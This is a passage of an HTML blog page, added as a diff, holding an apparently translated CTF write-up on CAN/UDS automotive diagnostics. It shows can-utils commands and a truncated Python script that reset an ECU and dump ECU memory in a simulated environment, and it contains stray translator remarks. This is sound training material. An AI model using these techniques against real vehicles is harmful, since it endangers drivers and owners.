@@ -1,0 +1,1846 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;p&gt;Hello! I am newp1ayer48 from Hackyboiz, responsible for the low-level area! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image01.jpg&#34; alt=&#34;image01.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In the automotive field, a communication protocol that is frequently used and applied is CAN communication. Security vulnerabilities can also occur in this CAN communication! Many CTFs and competitions are also being held targeting the automotive sector (Defcon also has a Car Hacking Village).&lt;/p&gt;
+&lt;p&gt;In this article, we&amp;#x2019;ll solve a problem from the BlockHarbor CTF, one of the most famous CTFs for vehicle hacking, to learn about vehicle communication and the resulting security vulnerabilities!&lt;/p&gt;
+&lt;h2 id=&#34;1-CAN-Bus-amp-UDS&#34;&gt;&lt;a href=&#34;#1-CAN-Bus-amp-UDS&#34; class=&#34;headerlink&#34; title=&#34;1. CAN Bus &amp;amp; UDS&#34;&gt;&lt;/a&gt;1. CAN Bus &amp;amp; UDS&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image02.png&#34; alt=&#34;[image02.png](https://t-shaped-person.tistory.com/51)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;CAN (Controller Area Network) communication is a protocol developed for communication between devices within a vehicle, such as ECUs (Electronic Control Units). It uses a message-based, low-level network communication system in a non-host bus manner. Since it was developed in 1983, it predates the HTTP protocol! A basic CAN message consists of 8 Bytes, and the extended version, CAN-FD (Flexible Data-rate), can represent data up to 64 Bytes.&lt;/p&gt;
+&lt;p&gt;Furthermore, the international standard for CAN communication is specified by ISO 15765.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image03.png&#34; alt=&#34;[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;UDS stands for Unified Diagnostic Services, and you&amp;#x2019;ll frequently encounter this term when dealing with vehicle CTFs and CAN communication. It is a protocol used for diagnostic communication, primarily employed with ECUs. Since it is a higher-level protocol than the low-level CAN protocol, it allows for various functions such as data Read/Write (R/W).&lt;/p&gt;
+&lt;p&gt;The international standard for the UDS message structure operating over CAN communication was designated by ISO 15765.&lt;/p&gt;
+&lt;p&gt;Since knowing the UDS message structure is crucial for the BlockHarbor CTF challenge we are about to solve, let&amp;#x2019;s briefly look at it. The UDS message is structured as shown in the picture above. A simple explanation of each part is as follows:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CAN ID: The ECU that will transmit or receive the message.&lt;/li&gt;
+&lt;li&gt;PCI (Protocol Control Information): Primarily used for the length of the UDS message, Flow Control, etc.&lt;/li&gt;
+&lt;li&gt;SID (Service Identifier): Identifies the requested service.&lt;ul&gt;
+&lt;li&gt;Sub Function Byte: Detailed options for the SID.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;DID (Data Identifier): Identifies the data being accessed.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now, I will explain some of the more important items among these.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image04.png&#34; alt=&#34;image04.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The CAN ID values for each ECU are set as hexadecimal values according to ISO 15765-4.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;7DF&lt;/code&gt; is primarily the identifier used for broadcasting to all ECUs or for internal functions/settings to be delivered to an ECU.&lt;/li&gt;
+&lt;li&gt;For transmission, the CAN IDs are designated as &lt;code&gt;7E0&lt;/code&gt; for ECU 1, &lt;code&gt;7E1&lt;/code&gt; for ECU 2, and so on.&lt;/li&gt;
+&lt;li&gt;For reception, the ID is designated as the transmission value &lt;code&gt;+ 0x8&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The SID (Service Identifier) can simply be described as the identifier that signals what action (service) will be performed. Since the SID values are also standardized, you can directly check the SID value corresponding to a service through the &lt;a href=&#34;https://en.wikipedia.org/wiki/Unified_Diagnostic_Services&#34;&gt;document&lt;/a&gt;. The corresponding Response SID (RSID) value is the request SID value &lt;code&gt;+ 0x40&lt;/code&gt;. If the RSID, which is the response to the requested SID, is successfully received, it indicates that the communication was successful.&lt;/p&gt;
+&lt;p&gt;Additionally, there are commands among the SIDs that include a Sub Function Byte. This is used to designate a more detailed service request when an SID is requested. It is optional and may or may not be used, which can be confirmed by checking the documentation.&lt;/p&gt;
+&lt;p&gt;The DID (Data Identifier) is the identifier that refers to the data. Many DID values are also reserved according to the ISO-14229 standard, so you can check the &lt;a href=&#34;https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/&#34;&gt;document&lt;/a&gt; to find the appropriate DID value. The most representative example of a DID is the VIN (Vehicle Identification Number) value, which is &lt;code&gt;F190&lt;/code&gt;. If you request this DID value along with an SID, the service corresponding to the SID will be executed targeting the VIN.&lt;/p&gt;
+&lt;p&gt;In the case of SIDs that use the Sub Function Byte, which we just explained, there are instances where a DID may not be necessary.&lt;/p&gt;
+&lt;p&gt;When solving the upcoming BlockHarbor CTF problems, it is absolutely essential to keep the &lt;a href=&#34;https://en.wikipedia.org/wiki/Unified_Diagnostic_Services&#34;&gt;SID&lt;/a&gt; and &lt;a href=&#34;https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/&#34;&gt;DID&lt;/a&gt; documentation pages open and look up the commands as you go!&lt;/p&gt;
+&lt;h3 id=&#34;1-1-CAN-Utils&#34;&gt;&lt;a href=&#34;#1-1-CAN-Utils&#34; class=&#34;headerlink&#34; title=&#34;1.1. CAN Utils&#34;&gt;&lt;/a&gt;1.1. CAN Utils&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image05.jpg&#34; alt=&#34;image05.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To transmit and receive CAN/UDS messages, you can use the can-utils tool. This tool is based on SocketCAN, which implements the CAN protocol on Linux. I&amp;#x2019;ll explain this using the example shown below.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;candump -a vcan0,7E0:7FF&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;candump&lt;/code&gt; is a tool that allows you to receive CAN/UDS messages. By specifying the desired CAN network interface, you can receive CAN messages from that interface. In the example above , the &lt;code&gt;-a&lt;/code&gt; option was added to show the ASCII results along with the CAN message, and masking arguments &lt;code&gt;7E0&lt;/code&gt; and &lt;code&gt;7FF&lt;/code&gt; were added to receive data only from ECU 1.&lt;/p&gt;
+&lt;p&gt;When solving the CTF problems later, this command will be frequently used on one terminal to run and check the responses.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#0322F190 &amp;amp;&amp;amp; cansend vcan0 7E0#30000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;cansend&lt;/code&gt; is a tool that allows you to transmit CAN/UDS messages. Similarly, it can send a CAN message to the desired CAN network interface. For the upcoming problems, you will need to construct the message by properly configuring the SID and DID according to the UDS format explained earlier and then transmit it.&lt;/p&gt;
+&lt;p&gt;Additionally, for cases where the response data is larger than the basic CAN message length of 8 Bytes, a commonly used technique is to send a Flow Control request, such as &lt;code&gt;30000000&lt;/code&gt;, along with the message to ensure all data is received.&lt;/p&gt;
+&lt;p&gt;By using &lt;code&gt;cansend&lt;/code&gt; to transmit a message and then confirming the response data with &lt;code&gt;candump&lt;/code&gt;, you can verify the entire CAN/UDS communication process.&lt;/p&gt;
+&lt;h2 id=&#34;2-Blockharbor-CTF&#34;&gt;&lt;a href=&#34;#2-Blockharbor-CTF&#34; class=&#34;headerlink&#34; title=&#34;2. Blockharbor CTF&#34;&gt;&lt;/a&gt;2. Blockharbor CTF&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image06.jpg&#34; alt=&#34;image06.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;BlockHarbor CTF is an Automotive Capture the Flag (CTF) competition created by the automotive cybersecurity company, Block Harbor. It is highly recommended for solving vehicle hacking problems because it provides a virtual CAN interface environment and a simulation environment for communication between ECUs, making it convenient for hands-on practice with CAN/UDS commands.&lt;/p&gt;
+&lt;p&gt;The site is broadly composed of two parts: the &lt;a href=&#34;https://proving-grounds.blockharbor.io/&#34;&gt;CTF Problem Site&lt;/a&gt;, which is built on the CTFd platform, and the &lt;a href=&#34;https://core.ed.vsec.blockharbor.io/block/learn&#34;&gt;VSEC&lt;/a&gt; site, which establishes the vehicle simulation environment. If you are new to CAN/UDS and vehicle systems, it is recommended that you start with the &amp;#x201C;Getting Started&amp;#x201D; problems on the CTF problem site.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image07.png&#34; alt=&#34;image07.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When you connect to &lt;a href=&#34;https://core.ed.vsec.blockharbor.io/block/learn&#34;&gt;VSEC&lt;/a&gt;, navigate to Other - Learn - SIMULATIONS. By clicking the terminal icon on the right side of Proving Grounds, you can access the vehicle simulation environment&amp;#x2019;s terminal via the web in various environments. Since we will be solving the UDS Challenge problems, we will connect to the UDS Challenge terminal. If you are solving different problems, you can connect to another simulation terminal and use the environment appropriate for that problem.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image08.png&#34; alt=&#34;image08.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When you connect via the terminal icon, you will access a tmux shell like the one shown above. You can solve the CTF problems you&amp;#x2019;ve identified within this environment.&lt;/p&gt;
+&lt;h3 id=&#34;2-1-tmux-setting&#34;&gt;&lt;a href=&#34;#2-1-tmux-setting&#34; class=&#34;headerlink&#34; title=&#34;2.1 tmux setting&#34;&gt;&lt;/a&gt;2.1 tmux setting&lt;/h3&gt;&lt;p&gt;To use the tmux terminal environment, you can configure a better problem-solving setup with a few tmux commands and settings. BlockHarbor itself has created a basic &lt;a href=&#34;https://cantreally.cyou/posts/how-i-use-tmux/&#34;&gt;tmux introduction&lt;/a&gt; via their landing page. I will explain a few of the frequently used commands from that guide.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image09.png&#34; alt=&#34;image09.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Terminal splitting&lt;/span&gt;
+Ctrl + b
+%
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# Terminal moving&lt;/span&gt;
+Ctrl + b
+&amp;#x2190; &amp;#x2192;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# Terminal scroll&lt;/span&gt;
+Ctrl + b
+[
+&lt;span class=&#34;hljs-comment&#34;&gt;# End scroll&lt;/span&gt;
+Ctrl + c&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You didn&amp;#x2019;t provide the list of tmux commands, but based on your comment, here is the translation emphasizing the general idea:&lt;/p&gt;
+&lt;p&gt;The commands and settings listed above are those that are frequently used in practice. Terminal splitting and navigation are used especially often. For additional settings or commands you may want, you can check the &lt;a href=&#34;https://cantreally.cyou/posts/how-i-use-tmux/&#34;&gt;tmux intro&lt;/a&gt; or search online.&lt;/p&gt;
+&lt;h2 id=&#34;3-UDS-Challenge&#34;&gt;&lt;a href=&#34;#3-UDS-Challenge&#34; class=&#34;headerlink&#34; title=&#34;3. UDS Challenge&#34;&gt;&lt;/a&gt;3. UDS Challenge&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image10.png&#34; alt=&#34;image10.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The UDS Challenge problems we will solve are tackled by performing the actions required by the problem using UDS commands and controlling the vehicle environment. The &lt;a href=&#34;https://en.wikipedia.org/wiki/Unified_Diagnostic_Services&#34;&gt;SID&lt;/a&gt; and &lt;a href=&#34;https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/&#34;&gt;DID&lt;/a&gt; used to solve the problems can be found in the documentation introduced earlier.&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s start solving the problems right away!&lt;/p&gt;
+&lt;h3 id=&#34;3-1-Simulation-VIN&#34;&gt;&lt;a href=&#34;#3-1-Simulation-VIN&#34; class=&#34;headerlink&#34; title=&#34;3.1. Simulation VIN&#34;&gt;&lt;/a&gt;3.1. Simulation VIN&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image11.png&#34; alt=&#34;image11.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This problem requires you to retrieve the VIN (Vehicle Identification Number) using UDS.&lt;/p&gt;
+&lt;p&gt;The VIN is the Vehicle Identification Number, which was briefly discussed when explaining the commands earlier! The task is to query this value in the simulation environment.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image12.png&#34; alt=&#34;image12.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The translation is:&lt;/p&gt;
+&lt;p&gt;First, by checking the network interfaces in the simulation environment, you can confirm the virtual CAN interface, vcan0. You should target this interface when transmitting and receiving CAN/UDS messages.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image13.png&#34; alt=&#34;image13.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 03(PCI:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)&lt;/span&gt;
+cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#0322F190 &amp;amp;&amp;amp; cansend vcan0 7E0#30000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To monitor the transmission and reception messages for the broadcast and ECU 1, I added masking for three CAN IDs in candump. Afterward, I combined the VIN DID and the Read Data By Identifier (SID) and transmitted the message. Since the response comes from ECU 1, by sending a Flow Control request to that ECU, the full VIN can be confirmed, and the flag can be identified!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;e66fb3f67ac3:~$ candump -a vcan0,&lt;span class=&#34;hljs-number&#34;&gt;7E0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;FF,&lt;span class=&#34;hljs-number&#34;&gt;7E8&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;FF,&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;DF:&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;FF
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;DF   [&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;03&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt; F1 &lt;span class=&#34;hljs-number&#34;&gt;90&lt;/span&gt;               &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;.&amp;quot;..&amp;apos;&lt;/span&gt;
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7E8&lt;/span&gt;   [&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;62&lt;/span&gt; F1 &lt;span class=&#34;hljs-number&#34;&gt;90&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;66&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;C &lt;span class=&#34;hljs-number&#34;&gt;61&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;..b..fla&amp;apos;&lt;/span&gt;
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7E0&lt;/span&gt;   [&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;               &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;0...&amp;apos;&lt;/span&gt;
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7E8&lt;/span&gt;   [&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;67&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;B &lt;span class=&#34;hljs-number&#34;&gt;76&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;E &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;F &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;!g{     &amp;apos;&lt;/span&gt;
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7E8&lt;/span&gt;   [&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;D &lt;span class=&#34;hljs-number&#34;&gt;61&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;63&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;68&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;D   &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;quot;      }&amp;apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;#x2019;s examine the received message in detail.&lt;/p&gt;
+&lt;p&gt;Upon making the Read Data By Identifier request (&lt;code&gt;22&lt;/code&gt;), we can confirm the correct RSID (&lt;code&gt;62&lt;/code&gt;) response. Following this, a large amount of data is returned, and continuous values like &lt;code&gt;21&lt;/code&gt; and &lt;code&gt;22&lt;/code&gt; are indicated before these data packets. This confirms that the data is continuous (a multi-frame transfer). &lt;/p&gt;
+&lt;h3 id=&#34;3-2-Startup-Message&#34;&gt;&lt;a href=&#34;#3-2-Startup-Message&#34; class=&#34;headerlink&#34; title=&#34;3.2. Startup Message&#34;&gt;&lt;/a&gt;3.2. Startup Message&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image14.png&#34; alt=&#34;image14.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This problem asks about how to restart an ECU. It also states that the diagnostic information is broadcast using &lt;code&gt;7DF&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image15.png&#34; alt=&#34;image15.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)&lt;/span&gt;
+cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#021101&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The simple way to Restart the ECU is to send a Reset request (&lt;code&gt;11&lt;/code&gt;). For the Reset request used in this problem, we use the Default Session (&lt;code&gt;01&lt;/code&gt;) Sub Function Byte. Because of this, no separate DID is used. &lt;/p&gt;
+&lt;p&gt;When the ECU Reset request with the Default Session is transmitted, you can confirm the corresponding RSID response (&lt;code&gt;51&lt;/code&gt;). Subsequently, you can also obtain the flag information!&lt;/p&gt;
+&lt;h3 id=&#34;3-3-Engine-Trouble&#34;&gt;&lt;a href=&#34;#3-3-Engine-Trouble&#34; class=&#34;headerlink&#34; title=&#34;3.3. Engine Trouble?&#34;&gt;&lt;/a&gt;3.3. Engine Trouble?&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image16.png&#34; alt=&#34;image16.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This problem requires reading the Diagnostic Trouble Codes (DTCs). You must authenticate the flag by matching the DTC format, which is typically &lt;code&gt;Pxxxx-xx&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image17.png&#34; alt=&#34;image17.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 03(PCI:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)&lt;/span&gt;
+cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#03190208&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The problem can be solved by sending a Read DTC Information request (&lt;code&gt;19&lt;/code&gt;). The DTC (Diagnostic Trouble Codes) can be viewed using a Status Mask. The detailed DTC Status Byte can be found in the &lt;a href=&#34;https://buly.kr/2UjxlRq&#34;&gt;AUTOSAR documentation&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The confirmed DTC is &lt;code&gt;P3E9F-01&lt;/code&gt;. Since DTCs are used in OBD2 for vehicle diagnostics, you can refer to the corresponding standard, the &lt;a href=&#34;https://piembsystech.com/iso-15031-protocol/&#34;&gt;ISO 15031&lt;/a&gt; document, to understand how to interpret the DTC code.&lt;/p&gt;
+&lt;h3 id=&#34;3-4-Secrets-in-Memory&#34;&gt;&lt;a href=&#34;#3-4-Secrets-in-Memory&#34; class=&#34;headerlink&#34; title=&#34;3.4. Secrets in Memory?&#34;&gt;&lt;/a&gt;3.4. Secrets in Memory?&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image18.png&#34; alt=&#34;image18.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This problem requires a Read Memory By Address request. The accessible memory area is stated to start from &lt;code&gt;0xC3F80000&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image19.png&#34; alt=&#34;image19.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 07(PCI:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)&lt;/span&gt;
+cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#072314C3F83000FF &amp;amp;&amp;amp; cansend vcan0 7E0#30000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Data in memory can be read using a memory read request (&lt;code&gt;23&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;A point to note here is that you must calculate and use the value (&lt;code&gt;14&lt;/code&gt;) corresponding to the AddressAndLengthFormatIdentifier (AALFId) before specifying the address. You can understand the explanation of AALFId by referring to &lt;a href=&#34;https://www.youtube.com/watch?v=s2uC4vWMU7Q&amp;amp;t=104s&#34;&gt;this video&lt;/a&gt;. Consequently, reading is possible by sending a read request for 255 (&lt;code&gt;FF&lt;/code&gt;) bytes using the value &lt;code&gt;14&lt;/code&gt;, which requests the use of a 4-byte address and 1-byte length format.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;build_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;can_id, data&lt;/span&gt;):&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, can_id, len(data), data.ljust(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;dissect_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;frame&lt;/span&gt;):&lt;/span&gt;
+    can_id, dlc, data = struct.unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, frame)
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; can_id, data[:dlc]
+
+recvdata = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; p:
+    p.bind((&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;vcan0&amp;quot;&lt;/span&gt;,))
+    p.settimeout(&lt;span class=&#34;hljs-number&#34;&gt;0.5&lt;/span&gt;)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; addr &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;0xC3F83000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xC3F865ff&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xFF&lt;/span&gt;):
+        req_data = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x07\x23\x14&amp;quot;&lt;/span&gt; + addr.to_bytes(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;big&amp;quot;&lt;/span&gt;) + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\xff&amp;quot;&lt;/span&gt;
+        p.send(build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7DF&lt;/span&gt;, req_data))
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
+            resp_frame = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+            resp_id, resp_data = dissect_can_frame(resp_frame)
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; resp_data:
+                recvdata += resp_data.hex()[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:]
+        &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; socket.timeout:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;continue&lt;/span&gt;
+
+        flow_control_data = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x30\x00\x00\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+        p.send(build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, flow_control_data))
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;36&lt;/span&gt;):
+            &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
+                resp_frame = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+                _, resp_data = dissect_can_frame(resp_frame)
+                tempdata = resp_data.hex()[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:]
+                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; tempdata != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;00000000000000&amp;quot;&lt;/span&gt;:
+                    recvdata += tempdata
+            &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; socket.timeout:
+                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    hex_data_string = recvdata
+
